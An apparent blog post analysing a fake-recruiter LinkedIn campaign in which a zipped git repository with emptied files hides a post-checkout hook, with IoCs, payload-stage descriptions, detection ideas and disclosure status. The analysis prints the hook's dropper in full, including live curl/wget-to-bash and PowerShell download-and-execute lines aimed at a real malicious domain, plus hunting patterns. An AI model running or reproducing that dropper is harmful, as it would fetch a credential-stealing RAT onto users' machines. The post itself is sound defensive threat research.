+++
title = "Anatomy of a LinkedIn \"fake job\" malware drop: the DeFi_share.zip git-hook trap"
date = 2026-08-08T14:00:00+08:00
description = "A recruiter-sent project archive with a zeroed working tree and a planted .git/hooks/post-checkout: any git checkout pipes a remote payload into your shell."
+++

A LinkedIn "recruiter" pitching an AI-DeFi job sent me a project
archive (`DeFi_share.zip`). The archive contains a git repository in which
**every working-tree file is truncated to zero bytes** and a
`.git/hooks/post-checkout` script is planted. Anyone who tries to "fix" the
apparently broken checkout with `git checkout .` or `git switch dev`
automatically executes the hook, which pipes a remote second-stage payload from
`iploglab.store` into bash/PowerShell. The kit matches a publicly documented
fake-recruiter campaign; the final payload is a JavaScript infostealer/RAT
targeting SSH keys, `.env` files, browser credential stores, and crypto
wallets.

## The approach

I was contacted on LinkedIn by a 1st-degree connection — an account (whose
real owner I'll leave unnamed; it was most likely hijacked) claiming to be
"Managing Partner at Eli5" (London), recruiting a "blockchain consultant" for
an "AI powered DeFi & Trading platform."

Red flags in the persona (visible in hindsight):

- **Implausible biography**: airline pilot from 1968 (→ ~80 years old today),
  39 years reconditioning truck gearboxes in South Africa, then abruptly
  "Managing General Partner, Crypto Dapp" (2020) and "Managing Partner, Eli5"
  (London, 2023). Consistent with a hijacked real account of an elderly South
  African man.
- Title typo ("Managing Parter"), 1,410 followers, 500+ connections, **zero
  posts, zero activity** — an aged but inert shell account.
- One mutual connection (the actual trust vector into my network).

## The conversation (social layer)

The chat followed a recognizable script over ~2 weeks (Jul 17 – Aug 5, 2026):

- Generic copy-paste pitch ("AI powered decentralized finance platform…
  intelligent agents… Proof of Concept stage") — sent **twice, verbatim**, a
  day apart.
- Every substantive question ("Who are the target users?", "What's the gap
  you're trying to fill?") dodged or answered with "Both of them".
- A **very generous salary expectation accepted instantly**: "Your salary range
  works good for us." No interview, no technical screen, no defined role.
- Persistent steering toward one action: review the code **before** any call
  with the "CTO":

  > "There are 2 git branches in the project.
  > - main : project structure
  > - dev : codebase in the progress
  > Please review the codebase in the dev branch and let's continue our discussion."

  and later:

  > "If you want to run the project, push the project into the online server and try that."

Both suggested actions — checking out the `dev` branch and pushing the repo —
are exactly the two operations that detonate the planted hooks (see below).

The project was shared via a **LimeWire link**, not via GitHub — because
`git clone` does **not** transfer hooks; the payload requires the victim to
receive a full `.git/` directory as a file archive.

## The artifact

`DeFi_share.zip` (~6 MB, 935 entries) contains `DeFi_share/DeFi/`, a
React/TypeScript + Node.js "DeFi trading platform" ("CoreX") with a bundled
`.git/` directory.

### The zeroed working tree (the bait)

- **Every working-tree source file is 0 bytes**: all `src/**/*.tsx`, server
  controllers, Solidity contracts — everything.
- The **git object store is fully populated** (~6 MB of real blobs: a 3.5 MB
  minified JS bundle, Hardhat/solc build artifacts, PNG assets, an elaborate
  12 KB README).
- Git timestamps: objects date from April 2026; the hooks were modified
  July 21 – Aug 5, 2026 — i.e., a pre-existing project was recycled and
  weaponized later.

The staged victim experience: unzip → browse → *every file is empty* → reflex:
`git status` (all "modified") → `git checkout .` or `git switch dev` "to
restore the files" → **the hook fires**.

### The hooks (the trigger)

Three non-sample files in `.git/hooks/` (mode `rwxrwxr-x`, preserved by the
zip):

- **`post-checkout`** — fires on *any* successful checkout, including
  `git checkout .` (flag 0) and `git switch`/`git checkout <branch>` (flag 1).
- **`post-push`** — byte-identical copy (same SHA-256). Fires after any push.
- `post-cd` — empty file; not a real git hook (camouflage/decoy).

The hook is disguised with a comment header claiming to be a *disabled
example*, followed by blank-line padding. Effective content:

```sh
#!/bin/sh
# post-checkout: invoked after checkout or branch switch (success only).
# Args: $1 = prev HEAD, $2 = new HEAD, $3 = flag (1=branch, 0=file).
#
# Run your own local work in the background (example; disabled):

uname_s="$(uname -s 2>/dev/null || echo unknown)"
case "$uname_s" in
  Darwin)
    curl -fsSL 'https://iploglab.store/api/terminal/bootstrap?os=mac&flag=4' | bash >/dev/null 2>&1
    exit 0
    ;;
  Linux)
    wget -qO- 'https://iploglab.store/api/terminal/bootstrap?os=linux&flag=4' | bash >/dev/null 2>&1
    exit 0
    ;;
  MINGW*|MSYS*|CYGWIN*)
    powershell -NoProfile -ExecutionPolicy Bypass -Command "Invoke-RestMethod -Uri 'https://iploglab.store/api/terminal/windows?flag=4' | Invoke-Expression" >/dev/null 2>&1
    exit 0
    ;;
  *)
    exit 0
    ;;
esac
```

Properties:

- **Cross-platform**: macOS (curl), Linux (wget), Windows (PowerShell IEX,
  with `-ExecutionPolicy Bypass`).
- **Silent**: all output discarded; the hook always exits 0, so git reports
  success and the victim sees nothing unusual.
- **`flag=4`** is a campaign/variant selector (see below), not a victim
  identifier.

### The decoy project

The rest is plausible cover: `package.json` has **clean scripts** (no
malicious `preinstall`/`postinstall`), and all ~640k lines of
`package-lock.json` resolve to the official npm registry — no planted
dependency confusion. The 12 KB README reads like LLM-generated marketing
copy. Nothing in the visible project is malicious; the entire attack lives in
the git metadata layer, where code reviewers don't look.

### The C2 / payload infrastructure

- Domain: **`iploglab.store`** — registered/hosted on **Hostinger**
  (parking nameservers `nebula/aurora.dns-parking.com`; A records
  `84.32.84.115`, `88.222.222.196`).
- The name mimics an **IP-logger/geolocation service** — matching the
  documented behavior of a sibling domain (`nnlabs.pro`), which served
  IP-geolocation info to browsers but the dropper to curl/wget.
- Already listed on threat-intel feeds (SOCRadar Maltrail IoC report,
  2026-07-28: "apt espionage malware", High).

## Campaign attribution: a shared kit

This is not a bespoke attack; it is a consumer of a documented kit. Andrii
Romasiun's writeup
["Investigating malware spreading through Git repositories"](https://andrii.ro/blog/investigating-malware)
(May 2026) describes the **identical playbook** from another LinkedIn
approach:

- Same lure: recruiter chat → file-host link (Google Drive there, LimeWire
  here) → repo with **all files empty** and "master is just project structure,
  check out the `dev` branch" instructions.
- Same hook skeleton: `uname -s` case switch, per-OS pipe-to-shell, `?flag=N`
  parameter, `exit 0` everywhere. (That sample: `nnlabs.pro/...?flag=6`; this
  one: `iploglab.store/...?flag=4` — rotated domain, different flag.)
- Same Hostinger hosting pattern.

Differences are operator-level customizations: the `post-push` hook and the
fake "disabled example" comment header are additions relative to the published
sample.

### What detonation leads to (per Romasiun's analysis of the sibling sample)

1. **Stage 1** (the URL in the hook): drops a bootstrap script into
   `~/.vscode/` and runs it via `nohup` so it survives shell exit.
2. **Stage 2**: ensures Node.js is installed, then downloads `env-setup.js` +
   dependencies (`axios`, `socket.io-client`, `sql.js`, `clipboardy`,
   `hardhat`, …).
3. **Stage 3**: a ~3.4 MB obfuscated JavaScript payload (rotated string-array
   obfuscation, custom Base64 alphabet, RC4-style string decoding, per-flag
   payload selection from base64/gzip blobs hosted on jsonkeeper.com),
   spawning:
   - an **infostealer** crawling for `.env*`, `id_ed25519*`, `*.db`, wallet
     files, certificates across home dirs and priority paths
     (Desktop/Documents/Downloads), auto-uploading files <10 MB;
   - an **on-demand file uploader**;
   - a **socket.io RAT** (shell command execution, directory listing, file
     read/upload) with a **clipboard watcher** polling every second.

So the campaign's targeting makes sense: developers in crypto, whose machines
hold SSH keys, cloud credentials in `.env` files, browser sessions, and wallet
keystores.

## IoCs

The indicators below are defanged (`hxxps://`, `[.]`) so that nothing here is
a working link to live malware infrastructure. If you have a legitimate
research or defensive use for the concrete, unredacted details, send me an
email.

| Indicator | Value |
|---|---|
| C2 domain | `iploglab[.]store` (defanged) |
| Payload URLs | `hxxps://iploglab[.]store/api/terminal/bootstrap?os={mac,linux}&flag=4`, `hxxps://iploglab[.]store/api/terminal/windows?flag=4` (defanged) |
| C2 IPs | `84.32.84[.]115`, `88.222.222[.]196` (defanged) |
| Nameservers | `nebula[.]dns-parking[.]com`, `aurora[.]dns-parking[.]com` (Hostinger, defanged) |
| Distribution URL | `hxxps://limewire[.]com/d/TT5dc#VUpamBXRXE` (defanged) |
| LinkedIn persona | "Managing Partner at Eli5" (likely hijacked account; name withheld) |
| Archive SHA-256 | `dae670d947e69574c0edfcbea65bc4ff2f4270dfcab9f708ad4888e8d28625fa` |
| `post-checkout` hook SHA-256 | `ae837640f595bfa6c769157bfc0b895408f093431cb3865e5583c042f83373a1` |
| `post-push` hook SHA-256 | `ae837640f595bfa6c769157bfc0b895408f093431cb3865e5583c042f83373a1` (identical) |
| Repo refs | `main = a2146745569c812c96d7f9c7a819e2b92311b7f9`, `dev = 22afc99e1055daa1e29a4d82cec3c79f545452c7` |
| Related IoCs (documented campaign) | `nnlabs[.]pro`, payload host `jsonkeeper[.]com`, backend `216.126.225[.]243:8085/8086/8087` (per Romasiun; defanged) |

### Detection / hunting ideas

- Search developer machines for non-sample hooks:
  `find . -path '*/.git/hooks/*' ! -name '*.sample' -type f`.
- Audit shell/network telemetry for `curl|wget` piping into `bash`/`sh` from
  `git`-spawned processes; PowerShell `-ExecutionPolicy Bypass` +
  `Invoke-RestMethod`.
- Post-infection artifacts (from the documented payload):
  `~/.vscode/vscode-bootstrap.sh`, `~/.vscode/env-setup.js`, node processes
  with `--max-old-space-size=4096 --no-warnings -`,
  `/tmp/pid.<campaignId>.*.lock`, connections to ports 8085–8087.

## Why it works (and almost did)

1. **The execution hides in a reflex.** Victims model "running code" as a
   deliberate act; `git checkout` is below the threshold of what registers as
   an action. The zeroed working tree manufactures the exact command that
   detonates the trap.
2. **The lure passes competence-skepticism.** The persona reads as a
   *clueless, harmless* founder — an abundant real species. The visible layer
   (a "free work" grift) fully explains everything seen, and a target who
   "spots" that layer still opens the zip. Only intent-skepticism — "what
   action am I being steered toward?" — separates the two.
3. **The channel launders trust.** Hooks can't travel via `git clone`, so the
   payload *requires* an out-of-band archive — which the recruiter frame makes
   normal.
4. **The metadata layer is unreviewed.** Hooks are dotfiles inside `.git/`,
   invisible to every code-review habit. Even a careful reviewer reads source,
   not configuration.

### Defensive rules that held here

- Stranger-sent code is treated as a binary, not as text: static analysis only
  (`unzip -l`/`-p`, never extraction-and-tooling), ideally in a throwaway
  environment.
- Never contact C2 infrastructure from a non-sandboxed connection.
- The artifact's own suggestions (including "how to verify it") are part of
  the attack surface, not the audit plan.

## Reporting / disclosure status

- Mutual connection (the trust vector) warned.
- LinkedIn profile report: filed (malware distribution via messaging).
- Hostinger abuse (`abuse@hostinger.com` / Report Abuse form): pending —
  domain is both registered and hosted there.
- Google Safe Browsing report: pending.
- Domain already on SOCRadar Maltrail feed (2026-07-28).

## Timeline

| Date | Event |
|---|---|
| 2026-04-05 | Decoy "CoreX" project git history created |
| 2026-04-08 | Last legit commits; `dev` branch created |
| 2026-07-17 | First LinkedIn contact from the recruiter persona |
| 2026-07-21 | Malicious `post-checkout` hook added to repo |
| 2026-07-29 | I quote a salary expectation; instantly accepted |
| 2026-08-05 | Hooks finalized (`post-push` added); zip created; LimeWire link sent |
| 2026-08-05/06 | I grow suspicious ("this is all too vague"); sender insists on dev-branch review |
| 2026-08-08 | Static analysis; trap identified; zip quarantined, never extracted |

---

*Analysis performed entirely statically (archive listing, byte-level
inspection of git objects and hooks, DNS lookups). The archive was never
extracted to a working tree and no code from it was executed. The C2 URL was
never requested.*
